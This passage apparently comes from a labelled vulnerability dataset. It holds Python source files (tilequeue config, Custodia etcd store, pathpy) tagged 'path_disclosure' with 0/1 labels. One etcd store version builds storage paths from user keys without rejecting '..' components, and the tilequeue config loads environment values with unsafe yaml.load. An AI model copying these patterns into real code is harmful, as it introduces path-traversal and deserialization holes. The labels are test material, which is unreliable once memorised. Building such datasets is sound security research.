            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad
/n/n/n",0,path_disclosure
3,155,75f9e819e7e5c2132d29e5236739fae847279b32,"/tilequeue/config.py/n/nfrom tilequeue.tile import bounds_buffer
from tilequeue.tile import metatile_zoom_from_size
from yaml import load
import os


class Configuration(object):
    '''
    Flatten configuration from yaml
    '''

    def __init__(self, yml):
        self.yml = yml

        self.aws_access_key_id = \
            self._cfg('aws credentials aws_access_key_id') or \
            os.environ.get('AWS_ACCESS_KEY_ID')
        self.aws_secret_access_key = \
            self._cfg('aws credentials aws_secret_access_key') or \
            os.environ.get('AWS_SECRET_ACCESS_KEY')

        self.queue_cfg = self.yml['queue']

        self.store_type = self._cfg('store type')
        self.s3_bucket = self._cfg('store name')
        self.s3_reduced_redundancy = self._cfg('store reduced-redundancy')
        self.s3_path = self._cfg('store path')
        self.s3_date_prefix = self._cfg('store date-prefix')
        self.s3_delete_retry_interval = \
            self._cfg('store delete-retry-interval')

        seed_cfg = self.yml['tiles']['seed']
        self.seed_all_zoom_start = seed_cfg['all']['zoom-start']
        self.seed_all_zoom_until = seed_cfg['all']['zoom-until']
        self.seed_n_threads = seed_cfg['n-threads']

        seed_metro_cfg = seed_cfg['metro-extract']
        self.seed_metro_extract_url = seed_metro_cfg['url']
        self.seed_metro_extract_zoom_start = seed_metro_cfg['zoom-start']
        self.seed_metro_extract_zoom_until = seed_metro_cfg['zoom-until']
        self.seed_metro_extract_cities = seed_metro_cfg['cities']

        seed_top_tiles_cfg = seed_cfg['top-tiles']
        self.seed_top_tiles_url = seed_top_tiles_cfg['url']
        self.seed_top_tiles_zoom_start = seed_top_tiles_cfg['zoom-start']
        self.seed_top_tiles_zoom_until = seed_top_tiles_cfg['zoom-until']

        toi_store_cfg = self.yml['toi-store']
        self.toi_store_type = toi_store_cfg['type']
        if self.toi_store_type == 's3':
            self.toi_store_s3_bucket = toi_store_cfg['s3']['bucket']
            self.toi_store_s3_key = toi_store_cfg['s3']['key']
        elif self.toi_store_type == 'file':
            self.toi_store_file_name = toi_store_cfg['file']['name']

        self.seed_should_add_to_tiles_of_interest = \
            seed_cfg['should-add-to-tiles-of-interest']

        seed_custom = seed_cfg['custom']
        self.seed_custom_zoom_start = seed_custom['zoom-start']
        self.seed_custom_zoom_until = seed_custom['zoom-until']
        self.seed_custom_bboxes = seed_custom['bboxes']
        if self.seed_custom_bboxes:
            for bbox in self.seed_custom_bboxes:
                assert len(bbox) == 4, (
                    'Seed config: custom bbox {} does not have exactly '
                    'four elements!').format(bbox)
                min_x, min_y, max_x, max_y = bbox
                assert min_x < max_x, \
                    'Invalid bbox. {} not less than {}'.format(min_x, max_x)
                assert min_y < max_y, \
                    'Invalid bbox. {} not less than {}'.format(min_y, max_y)

        self.seed_unique = seed_cfg['unique']

        intersect_cfg = self.yml['tiles']['intersect']
        self.intersect_expired_tiles_location = (
            intersect_cfg['expired-location'])
        self.intersect_zoom_until = intersect_cfg['parent-zoom-until']

        self.logconfig = self._cfg('logging config')
        self.redis_type = self._cfg('redis type')
        self.redis_host = self._cfg('redis host')
        self.redis_port = self._cfg('redis port')
        self.redis_db = self._cfg('redis db')
        self.redis_cache_set_key = self._cfg('redis cache-set-key')

        self.statsd_host = None
        if self.yml.get('statsd'):
            self.statsd_host = self._cfg('statsd host')
            self.statsd_port = self._cfg('statsd port')
            self.statsd_prefix = self._cfg('statsd prefix')

        process_cfg = self.yml['process']
        self.n_simultaneous_query_sets = \
            process_cfg['n-simultaneous-query-sets']
        self.n_simultaneous_s3_storage = \
            process_cfg['n-simultaneous-s3-storage']
        self.log_queue_sizes = process_cfg['log-queue-sizes']
        self.log_queue_sizes_interval_seconds = \
            process_cfg['log-queue-sizes-interval-seconds']
        self.query_cfg = process_cfg['query-config']
        self.template_path = process_cfg['template-path']
        self.reload_templates = process_cfg['reload-templates']
        self.output_formats = process_cfg['formats']
        self.buffer_cfg = process_cfg['buffer']
        self.process_yaml_cfg = process_cfg['yaml']

        self.postgresql_conn_info = self.yml['postgresql']
        dbnames = self.postgresql_conn_info.get('dbnames')
        assert dbnames is not None, 'Missing postgresql dbnames'
        assert isinstance(dbnames, (tuple, list)), \
            ""Expecting postgresql 'dbnames' to be a list""
        assert len(dbnames) > 0, 'No postgresql dbnames configured'

        self.wof = self.yml.get('wof')

        self.metatile_size = self._cfg('metatile size')
        self.metatile_zoom = metatile_zoom_from_size(self.metatile_size)
        self.metatile_start_zoom = self._cfg('metatile start-zoom')

        self.max_zoom_with_changes = self._cfg('tiles max-zoom-with-changes')
        assert self.max_zoom_with_changes > self.metatile_zoom
        self.max_zoom = self.max_zoom_with_changes - self.metatile_zoom

        self.sql_queue_buffer_size = self._cfg('queue_buffer_size sql')
        self.proc_queue_buffer_size = self._cfg('queue_buffer_size proc')
        self.s3_queue_buffer_size = self._cfg('queue_buffer_size s3')

        self.tile_traffic_log_path = self._cfg(
            'toi-prune tile-traffic-log-path')

        self.group_by_zoom = self.subtree('rawr group-zoom')

    def _cfg(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval[subkey]
        return yamlval

    def subtree(self, yamlkeys_str):
        yamlkeys = yamlkeys_str.split()
        yamlval = self.yml
        for subkey in yamlkeys:
            yamlval = yamlval.get(subkey)
            if yamlval is None:
                break
        return yamlval


def default_yml_config():
    return {
        'queue': {
            'name': None,
            'type': 'sqs',
            'timeout-seconds': 20
        },
        'store': {
            'type': 's3',
            'name': None,
            'path': 'osm',
            'reduced-redundancy': False,
            'date-prefix': '',
            'delete-retry-interval': 60,
        },
        'aws': {
            'credentials': {
                'aws_access_key_id': None,
                'aws_secret_access_key': None,
            }
        },
        'tiles': {
            'seed': {
                'all': {
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'metro-extract': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                    'cities': None
                },
                'top-tiles': {
                    'url': None,
                    'zoom-start': None,
                    'zoom-until': None,
                },
                'custom': {
                    'zoom-start': None,
                    'zoom-until': None,
                    'bboxes': []
                },
                'should-add-to-tiles-of-interest': True,
                'n-threads': 50,
                'unique': True,
            },
            'intersect': {
                'expired-location': None,
                'parent-zoom-until': None,
            },
            'max-zoom-with-changes': 16,
        },
        'toi-store': {
            'type': None,
        },
        'toi-prune': {
            'tile-traffic-log-path': '/tmp/tile-traffic.log',
        },
        'process': {
            'n-simultaneous-query-sets': 0,
            'n-simultaneous-s3-storage': 0,
            'log-queue-sizes': True,
            'log-queue-sizes-interval-seconds': 10,
            'query-config': None,
            'template-path': None,
            'reload-templates': False,
            'formats': ['json'],
            'buffer': {},
            'yaml': {
                'type': None,
                'parse': {
                    'path': '',
                },
                'callable': {
                    'dotted-name': '',
                },
            },
        },
        'logging': {
            'config': None
        },
        'redis': {
            'host': 'localhost',
            'port': 6379,
            'db': 0,
            'cache-set-key': 'tilequeue.tiles-of-interest',
            'type': 'redis_client',
        },
        'postgresql': {
            'host': 'localhost',
            'port': 5432,
            'dbnames': ('osm',),
            'user': 'osm',
            'password': None,
        },
        'metatile': {
            'size': None,
            'start-zoom': 0,
        },
        'queue_buffer_size': {
            'sql': None,
            'proc': None,
            's3': None,
        },
    }


def merge_cfg(dest, source):
    for k, v in source.items():
        if isinstance(v, dict):
            subdest = dest.setdefault(k, {})
            merge_cfg(subdest, v)
        else:
            dest[k] = v
    return dest


def _override_cfg(container, yamlkeys, value):
    """"""
    Override a hierarchical key in the config, setting it to the value.

    Note that yamlkeys should be a non-empty list of strings.
    """"""

    key = yamlkeys[0]
    rest = yamlkeys[1:]

    if len(rest) == 0:
        # no rest means we found the key to update.
        container[key] = value

    elif key in container:
        # still need to find the leaf in the tree, so recurse.
        _override_cfg(container, rest, value)

    else:
        # need to create a sub-tree down to the leaf to insert into.
        subtree = {}
        _override_cfg(subtree, rest, value)
        container[key] = subtree


def _make_yaml_key(s):
    """"""
    Turn an environment variable into a yaml key

    Keys in YAML files are generally lower case and use dashes instead of
    underscores. This isn't a universal rule, though, so we'll have to
    either change the keys to conform to this, or have some way of indicating
    this from the environment.
    """"""

    return s.lower().replace(""_"", ""-"")


def make_config_from_argparse(config_file_handle, default_yml=None):
    if default_yml is None:
        default_yml = default_yml_config()

    # override defaults from config file
    yml_data = load(config_file_handle)
    cfg = merge_cfg(default_yml, yml_data)

    # override config file with values from the environment
    for k in os.environ:
        # keys in the environment have the form TILEQUEUE__FOO__BAR (note the
        # _double_ underscores), which will decode the value as YAML and insert
        # it in cfg['foo']['bar'].
        #
        # TODO: should the prefix TILEQUEUE be configurable?
        if k.startswith('TILEQUEUE__'):
            keys = map(_make_yaml_key, k.split('__')[1:])
            value = load(os.environ[k])
            _override_cfg(cfg, keys, value)

    return Configuration(cfg)


def _bounds_pad_no_buf(bounds, meters_per_pixel_dim):
    return dict(
        point=bounds,
        line=bounds,
        polygon=bounds,
    )


def create_query_bounds_pad_fn(buffer_cfg, layer_name):

    if not buffer_cfg:
        return _bounds_pad_no_buf

    buf_by_type = dict(
        point=0,
        line=0,
        polygon=0,
    )

    for format_ext, format_cfg in buffer_cfg.items():
        format_layer_cfg = format_cfg.get('layer', {}).get(layer_name)
        format_geometry_cfg = format_cfg.get('geometry', {})
        if format_layer_cfg:
            for geometry_type, buffer_size in format_layer_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)
        if format_geometry_cfg:
            for geometry_type, buffer_size in format_geometry_cfg.items():
                buf_by_type[geometry_type] = max(
                    buf_by_type[geometry_type], buffer_size)

    if (buf_by_type['point'] ==
            buf_by_type['line'] ==
            buf_by_type['polygon'] == 0):
        return _bounds_pad_no_buf

    def bounds_pad(bounds, meters_per_pixel_dim):
        buffered_by_type = {}
        for geometry_type in ('point', 'line', 'polygon'):
            offset = meters_per_pixel_dim * buf_by_type[geometry_type]
            buffered_by_type[geometry_type] = bounds_buffer(bounds, offset)
        return buffered_by_type

    return bounds_pad
/n/n/n",1,path_disclosure
4,100,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def _absolute_key(self, key):
        """"""Get absolute path to key and validate key""""""
        if '//' in key:
            raise ValueError(""Invalid empty components in key '%s'"" % key)
        parts = key.split('/')
        if set(parts).intersection({'.', '..'}):
            raise ValueError(""Invalid relative components in key '%s'"" % key)
        return '/'.join([self.namespace] + parts).replace('//', '/')

    def get(self, key):
        try:
            result = self.etcd.get(self._absolute_key(key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = self._absolute_key(key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = self._absolute_key(keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(self._absolute_key(key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",0,path_disclosure
5,101,785fc87f38b4811bc4ce43a0a9b2267ee7d500b4,"/custodia/store/etcdstore.py/n/n# Copyright (C) 2015  Custodia Project Contributors - see LICENSE file

from __future__ import print_function

import os
import sys

import etcd

from custodia.store.interface import CSStore, CSStoreError, CSStoreExists


def log_error(error):
    print(error, file=sys.stderr)


class EtcdStore(CSStore):

    def __init__(self, config):
        self.server = config.get('etcd_server', '127.0.0.1')
        self.port = int(config.get('etcd_port', 4001))
        self.namespace = config.get('namespace', ""/custodia"")

        # Initialize the DB by trying to create the default table
        try:
            self.etcd = etcd.Client(self.server, self.port)
            self.etcd.write(self.namespace, None, dir=True)
        except etcd.EtcdNotFile:
            # Already exists
            pass
        except etcd.EtcdException as err:
            log_error(""Error creating namespace %s: [%r]"" % (self.namespace,
                                                             repr(err)))
            raise CSStoreError('Error occurred while trying to init db')

    def get(self, key):
        try:
            result = self.etcd.get(os.path.join(self.namespace, key))
        except etcd.EtcdException as err:
            log_error(""Error fetching key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to get key')
        return result.value

    def set(self, key, value, replace=False):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, value, prevExist=replace)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def span(self, key):
        path = os.path.join(self.namespace, key)
        try:
            self.etcd.write(path, None, dir=True, prevExist=False)
        except etcd.EtcdAlreadyExist as err:
            raise CSStoreExists(str(err))
        except etcd.EtcdException as err:
            log_error(""Error storing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to store key')

    def list(self, keyfilter='/'):
        path = os.path.join(self.namespace, keyfilter)
        if path != '/':
            path = path.rstrip('/')
        try:
            result = self.etcd.read(path, recursive=True)
        except etcd.EtcdKeyNotFound:
            return None
        except etcd.EtcdException as err:
            log_error(""Error listing %s: [%r]"" % (keyfilter, repr(err)))
            raise CSStoreError('Error occurred while trying to list keys')

        value = set()
        for entry in result.get_subtree():
            if entry.key == path:
                continue
            name = entry.key[len(path):]
            if entry.dir and not name.endswith('/'):
                name += '/'
            value.add(name.lstrip('/'))
        return sorted(value)

    def cut(self, key):
        try:
            self.etcd.delete(os.path.join(self.namespace, key))
        except etcd.EtcdKeyNotFound:
            return False
        except etcd.EtcdException as err:
            log_error(""Error removing key %s: [%r]"" % (key, repr(err)))
            raise CSStoreError('Error occurred while trying to cut key')
        return True
/n/n/n",1,path_disclosure
6,162,13360e223925e21d02d6132d342c47fe53abc994,"pathpy/HigherOrderNetwork.py/n/n# -*- coding: utf-8 -*-
""""""
    pathpy is an OpenSource python package for the analysis of time series data
    on networks using higher- and multi order graphical models.

    Copyright (C) 2016-2017 Ingo Scholtes, ETH Zürich

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU Affero General Public License as published
    by the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU Affero General Public License for more details.

    You should have received a copy of the GNU Affero General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.

    Contact the developer:

    E-mail: ischoltes@ethz.ch
    Web:    http://www.ingoscholtes.net
""""""

import collections as _co
import bisect as _bs
import itertools as _iter

import numpy as _np

import scipy.sparse as _sparse
import scipy.sparse.linalg as _sla
import scipy.linalg as _la
import scipy as _sp

from pathpy.Log import Log
from pathpy.Log import Severity


class EmptySCCError(Exception):
    """"""
    This exception is thrown whenever a non-empty strongly
    connected component is needed, but we encounter an empty one
    """"""
    pass


class HigherOrderNetwork:
    """"""
    Instances of this class capture a k-th-order representation
    of path statistics. Path statistics can originate from pathway
    data, temporal networks, or from processes observed on top
    of a network topology.
    """"""


    def __init__(self, paths, k=1, separator='-', nullModel=False,
        method='FirstOrderTransitions', lanczosVecs=15, maxiter=1000):
        """"""
        Generates a k-th-order representation based on the given path statistics.

        @param paths: An instance of class Paths, which contains the path
            statistics to be used in the generation of the k-th order
            representation

        @param k: The order of the network representation to generate.
            For the default case of k=1, the resulting representation
            corresponds to the usual (first-order) aggregate network,
            i.e. links connect nodes and link weights are given by the
            frequency of each interaction. For k>1, a k-th order node
            corresponds to a sequence of k nodes. The weight of a k-th
            order link captures the frequency of a path of length k.

        @param separator: The separator character to be used in
            higher-order node names.

        @param nullModel: For the default value False, link weights are
            generated based on the statistics of paths of length k in the
            underlying path statistics instance. If True, link weights are
            generated from the first-order model (k=1) based on the assumption
            of independent links (i.e. corresponding) to a first-order
            Markov model.

        @param method: specifies how the null model link weights
            in the k-th order model are calculated. For the default
            method='FirstOrderTransitions', the weight
            w('v_1-v_2-...v_k', 'v_2-...-v_k-v_k+1') of a k-order edge
            is set to the transition probability T['v_k', 'v_k+1'] in the
            first order network. For method='KOrderPi' the entry
            pi['v1-...-v_k'] in the stationary distribution of the
            k-order network is used instead.
        """"""

        assert not nullModel or (nullModel and k > 1)

        assert method == 'FirstOrderTransitions' or method == 'KOrderPi', \
            'Error: unknown method to build null model'

        assert paths.paths.keys() and max(paths.paths.keys()) >= k, \
            'Error: constructing a model of order k requires paths of at least length k'

        ## The order of this HigherOrderNetwork
        self.order = k

        ## The paths object used to generate this instance
        self.paths = paths

        ## The nodes in this HigherOrderNetwork
        self.nodes = []

        ## The separator character used to label higher-order nodes.
        ## For separator '-', a second-order node will be 'a-b'.
        self.separator = separator

        ## A dictionary containing the sets of successors of all nodes
        self.successors = _co.defaultdict(lambda: set())

        ## A dictionary containing the sets of predecessors of all nodes
        self.predecessors = _co.defaultdict(lambda: set())

        ## A dictionary containing the out-degrees of all nodes
        self.outdegrees = _co.defaultdict(lambda: 0.0)

        ## A dictionary containing the in-degrees of all nodes
        self.indegrees = _co.defaultdict(lambda: 0.0)

        # NOTE: edge weights, as well as in- and out weights of nodes are 
        # numpy arrays consisting of two weight components [w0, w1]. w0 
        # counts the weight of an edge based on its occurrence in a subpaths 
        # while w1 counts the weight of an edge based on its occurrence in 
        # a longest path. As an illustrating example, consider the single 
        # path a -> b -> c. In the first-order network, the weights of edges 
        # (a,b) and (b,c) are both (1,0). In the second-order network, the 
        # weight of edge (a-b, b-c) is (0,1).

        ## A dictionary containing edges as well as edge weights
        self.edges = _co.defaultdict(lambda: _np.array([0., 0.]))

        ## A dictionary containing the weighted in-degrees of all nodes
        self.inweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        ## A dictionary containing the weighted out-degrees of all nodes
        self.outweights = _co.defaultdict(lambda: _np.array([0., 0.]))        

        if k > 1:
            # For k>1 we need the first-order network to generate the null model
            # and calculate the degrees of freedom

            # For a multi-order model, the first-order network is generated multiple times!
            # TODO: Make this more efficient
            g1 = HigherOrderNetwork(paths, k=1)
            A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

        if not nullModel:
            # Calculate the frequency of all paths of
            # length k, generate k-order nodes and set
            # edge weights accordingly
            node_set = set()
            iterator = paths.paths[k].items()

            if k==0:
                # For a 0-order model, we generate a dummy start node
                node_set.add('start')
                for key, val in iterator:
                    w = key[0]
                    node_set.add(w)
                    self.edges[('start',w)] += val
                    self.successors['start'].add(w)
                    self.predecessors[w].add('start')
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees['start'] = len(self.successors['start'])
                    self.outweights['start'] += val
            else:
                for key, val in iterator:
                    # Generate names of k-order nodes v and w
                    v = separator.join(key[0:-1]) 
                    w = separator.join(key[1:])
                    node_set.add(v)
                    node_set.add(w)
                    self.edges[(v,w)] += val
                    self.successors[v].add(w)
                    self.predecessors[w].add(v)
                    self.indegrees[w] = len(self.predecessors[w])
                    self.inweights[w] += val
                    self.outdegrees[v] = len(self.successors[v])
                    self.outweights[v] += val

            self.nodes = list(node_set)

            # Note: For all sequences of length k which (i) have never been observed, but
            #       (ii) do actually represent paths of length k in the first-order network,
            #       we may want to include some 'escape' mechanism along the
            #       lines of (Cleary and Witten 1994)

        else:
            # generate the *expected* frequencies of all possible
            # paths based on independently occurring (first-order) links

            # generate all possible paths of length k
            # based on edges in the first-order network
            possiblePaths = list(g1.edges.keys())

            for _ in range(k-1):
                E_new = list()
                for e1 in possiblePaths:
                    for e2 in g1.edges:
                        if e1[-1] == e2[0]:
                            p = e1 + (e2[1],)
                            E_new.append(p)
                possiblePaths = E_new

            # validate that the number of unique generated paths corresponds to the sum of entries in A**k
            assert (A**k).sum() == len(possiblePaths), 'Expected ' + str((A**k).sum()) + \
                ' paths but got ' + str(len(possiblePaths))

            if method == 'KOrderPi':
                # compute stationary distribution of a random walker in the k-th order network
                g_k = HigherOrderNetwork(paths, k=k, separator=separator, nullModel=False)
                pi_k = HigherOrderNetwork.getLeadingEigenvector(g_k.getTransitionMatrix(includeSubPaths=True),
                                                                normalized=True, lanczosVecs=lanczosVecs, maxiter=maxiter)
            else:
                # A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=True, transposed=False)
                T = g1.getTransitionMatrix(includeSubPaths=True)

            # assign link weights in k-order null model
            for p in possiblePaths:
                v = p[0]
                # add k-order nodes and edges
                for l in range(1, k):
                    v = v + separator + p[l]
                w = p[1]
                for l in range(2, k+1):
                    w = w + separator + p[l]
                if v not in self.nodes:
                    self.nodes.append(v)
                if w not in self.nodes:
                    self.nodes.append(w)

                # NOTE: under the null model's assumption of independent events, we
                # have P(B|A) = P(A ^ B)/P(A) = P(A)*P(B)/P(A) = P(B)
                # In other words: we are encoding a k-1-order Markov process in a k-order
                # Markov model and for the transition probabilities T_AB in the k-order model
                # we simply have to set the k-1-order probabilities, i.e. T_AB = P(B)

                # Solution A: Use entries of stationary distribution,
                # which give stationary visitation frequencies of k-order node w
                if method == 'KOrderPi':
                    self.edges[(v, w)] = _np.array([0, pi_k[g_k.nodes.index(w)]])

                # Solution B: Use relative edge weight in first-order network
                # Note that A is *not* transposed
                # self.edges[(v,w)] = A[(g1.nodes.index(p[-2]),g1.nodes.index(p[-1]))] / A.sum()

                # Solution C: Use transition probability in first-order network
                # Note that T is transposed (!)
                elif method == 'FirstOrderTransitions':
                    p_vw = T[(g1.nodes.index(p[-1]), g1.nodes.index(p[-2]))]
                    self.edges[(v, w)] = _np.array([0, p_vw])

                # Solution D: calculate k-path weights based on entries of squared k-1-order adjacency matrix

                # Note: Solution B and C are equivalent
                self.successors[v].add(w)
                self.indegrees[w] = len(self.predecessors[w])
                self.inweights[w] += self.edges[(v, w)]
                self.outdegrees[v] = len(self.successors[v])
                self.outweights[v] += self.edges[(v, w)]

        # Compute degrees of freedom of models
        if k == 0:
            # for a zero-order model, we just fit node probabilities
            # (excluding the special 'start' node)
            # Since probabilities must sum to one, the effective degree
            # of freedom is one less than the number of nodes
            # This holds for both the paths and the ngrams model
            self.dof_paths = self.vcount() - 2
            self.dof_ngrams = self.vcount() - 2
        else:
            # for a first-order model, self is the first-order network
            if k == 1:
                g1 = self
                A = g1.getAdjacencyMatrix(includeSubPaths=True, weighted=False, transposed=True)

            # Degrees of freedom in a higher-order ngram model
            s = g1.vcount()

            ## The degrees of freedom of the higher-order model, under the ngram assumption
            self.dof_ngrams = (s**k)*(s-1)

            # For k>0, the degrees of freedom of a path-based model depend on
            # the number of possible paths of length k in the first-order network.
            # Since probabilities in each row must sum to one, the degrees
            # of freedom must be reduced by one for each k-order node
            # that has at least one possible transition.

            # (A**k).sum() counts the number of different paths of exactly length k
            # based on the first-order network, which corresponds to the number of
            # possible transitions in the transition matrix of a k-th order model.
            paths_k = (A**k).sum()

            # For the degrees of freedom, we must additionally consider that
            # rows in the transition matrix must sum to one, i.e. we have to
            # subtract one degree of freedom for every non-zero row in the (null-model)
            # transition matrix. In other words, we subtract one for every path of length k-1
            # that can possibly be followed by at least one edge to a path of length k

            # This can be calculated by counting the number of non-zero elements in the
            # vector containing the row sums of A**k
            non_zero = _np.count_nonzero((A**k).sum(axis=0))

            ## The degrees of freedom of the higher-order model, under the paths assumption
            self.dof_paths = paths_k - non_zero


    def vcount(self):
        """""" Returns the number of nodes """"""
        return len(self.nodes)


    def ecount(self):
        """""" Returns the number of links """"""
        return len(self.edges)


    def totalEdgeWeight(self):
        """""" Returns the sum of all edge weights """"""
        if self.edges:
            return sum(self.edges.values())
        return _np.array([0, 0])


    def modelSize(self):
        """"""
        Returns the number of non-zero elements in the adjacency matrix
        of the higher-order model.
        """"""
        return self.getAdjacencyMatrix().count_nonzero()


    def HigherOrderNodeToPath(self, node):
        """"""
        Helper function that transforms a node in a
        higher-order network of order k into a corresponding
        path of length k-1. For a higher-order node 'a-b-c-d'
        this function will return ('a','b','c','d')

        @param node: The higher-order node to be transformed to a path.
        """"""
        return tuple(node.split(self.separator))


    def pathToHigherOrderNodes(self, path, k=None):
        """"""
        Helper function that transforms a path into a sequence of k-order nodes
        using the separator character of the HigherOrderNetwork instance

        Consider an example path (a,b,c,d) with a separator string '-'
        For k=1, the output will be the list of strings ['a', 'b', 'c', 'd']
        For k=2, the output will be the list of strings ['a-b', 'b-c', 'c-d']
        For k=3, the output will be the list of strings ['a-b-c', 'b-c-d']
        etc.

        @param path: the path tuple to turn into a sequence of higher-order nodes

        @param k: the order of the representation to use (default: order of the
            HigherOrderNetwork instance)
        """"""
        if k is None:
            k = self.order
        assert len(path) > k, 'Error: Path must be longer than k'

        if k == 0 and len(path) == 1:
            return ['start', path[0]]

        return [self.separator.join(path[n:n+k]) for n in range(len(path)-k+1)]


    def getNodeNameMap(self):
        """"""
        Returns a dictionary that can be used to map
        nodes to matrix/vector indices
        """"""

        name_map = {}
        for idx, v in enumerate(self.nodes):
            name_map[v] = idx
        return name_map


    def getDoF(self, assumption=""paths""):
        """"""
        Calculates the degrees of freedom (i.e. number of parameters) of
        this k-order model. Depending on the modeling assumptions, this either
        corresponds to the number of paths of length k in the first-order network
        or to the number of all possible k-grams. The degrees of freedom of a model
        can be used to assess the model complexity when calculating, e.g., the
        Bayesian Information Criterion (BIC).

        @param assumption: if set to 'paths', for the degree of freedon calculation in the BIC,
            only paths in the first-order network topology will be considered. This is
            needed whenever we are interested in a modeling of paths in a given network topology.
            If set to 'ngrams' all possible n-grams will be considered, independent of whether they
            are valid paths in the first-order network or not. The 'ngrams'
            and the 'paths' assumption coincide if the first-order network is fully connected.
        """"""
        assert assumption == 'paths' or assumption == 'ngrams', 'Error: Invalid assumption'

        if assumption == 'paths':
            return self.dof_paths
        return self.dof_ngrams


    def getDistanceMatrix(self):
        """"""
        Calculates shortest path distances between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating distance matrix in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))

        for v in self.nodes:
            dist[v][v] = 0

        for e in self.edges:
            dist[e[0]][e[1]] = 1

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if dist[v][w] > dist[v][k] + dist[k][w]:
                        dist[v][w] = dist[v][k] + dist[k][w]

        Log.add('finished.', Severity.INFO)

        return dist


    def getShortestPaths(self):
        """"""
        Calculates all shortest paths between all pairs of
        higher-order nodes using the Floyd-Warshall algorithm.
        """"""

        Log.add('Calculating shortest paths in higher-order network (k = ' +
                str(self.order) + ') ...', Severity.INFO)

        dist = _co.defaultdict(lambda: _co.defaultdict(lambda: _np.inf))
        shortest_paths = _co.defaultdict(lambda: _co.defaultdict(lambda: set()))

        for e in self.edges:
            dist[e[0]][e[1]] = 1
            shortest_paths[e[0]][e[1]].add(e)

        for k in self.nodes:
            for v in self.nodes:
                for w in self.nodes:
                    if v != w:
                        if dist[v][w] > dist[v][k] + dist[k][w]:
                            dist[v][w] = dist[v][k] + dist[k][w]
                            shortest_paths[v][w] = set()
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])
                        elif dist[v][w] == dist[v][k] + dist[k][w]:
                            for p in list(shortest_paths[v][k]):
                                for q in list(shortest_paths[k][w]):
                                    shortest_paths[v][w].add(p+q[1:])

        for v in self.nodes:
            dist[v][v] = 0
            shortest_paths[v][v].add((v,))

        Log.add('finished.', Severity.INFO)

        return shortest_paths


